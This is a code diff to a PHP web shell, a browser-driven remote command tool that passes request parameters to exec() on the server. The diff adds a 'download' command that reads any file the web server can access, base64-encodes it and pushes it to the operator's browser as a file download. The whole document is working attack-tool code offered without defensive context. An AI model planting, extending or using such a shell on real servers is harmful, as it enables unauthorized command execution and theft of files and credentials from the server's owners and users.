@@ -9,6 +9,10 @@ function featureShell($cmd, $cwd) {
         chdir($cwd);
         preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
         chdir($match[1]);
+    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
+        chdir($cwd);
+        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+        return featureDownload($match[1]);
     } else {
         chdir($cwd);
         exec($cmd, $stdout);
@@ -36,6 +40,21 @@ function featureHint($fileName, $cwd, $type) {
     return array(
         'files' => $files,
     );
+}
+
+function featureDownload($filePath) {
+    $file = @file_get_contents($filePath);
+    if ($file === FALSE) {
+        return array(
+            'stdout' => array('File not found / no read permission.'),
+            'cwd' => getcwd()
+        );
+    } else {
+        return array(
+            'name' => basename($filePath),
+            'file' => base64_encode($file)
+        );
+    }
 }
 
 if (isset($_GET["feature"])) {
@@ -195,8 +214,12 @@ if (isset($_GET["feature"])) {
 
                 _insertCommand(command);
                 makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function(response) {
-                    _insertStdout(response.stdout.join("\n"));
-                    updateCwd(response.cwd);
+                    if (response.hasOwnProperty('file')) {
+                        featureDownload(response.name, response.file)
+                    } else {
+                        _insertStdout(response.stdout.join("\n"));
+                        updateCwd(response.cwd);
+                    }
                 });
             }
 
@@ -233,6 +256,16 @@ if (isset($_GET["feature"])) {
                     _requestCallback
                 );
 
+            }
+
+            function featureDownload(name, file) {
+                var element = document.createElement('a');
+                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
+                element.setAttribute('download', name);
+                element.style.display = 'none';
+                document.body.appendChild(element);
+                element.click();
+                document.body.removeChild(element);
             }
 
             function genPrompt(cwd) {
